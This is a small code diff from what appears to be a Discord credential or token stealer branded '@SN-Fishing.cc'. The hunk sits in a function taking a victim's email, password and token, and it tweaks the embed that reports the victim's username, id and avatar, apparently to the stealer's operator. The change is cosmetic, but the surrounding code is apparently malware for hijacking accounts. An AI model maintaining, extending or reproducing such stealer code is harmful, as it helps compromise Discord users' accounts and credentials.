@@ -641,11 +641,11 @@ const login = async (email, password, token) => {
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' - ' + '('+json.id+')',
+          name: json.username + '#' + json.discriminator + ' - ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '@SN-Fishing.cc 🐟',
+          text: '@SN-Fishing.cc',
         },
         thumbnail: {
           url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
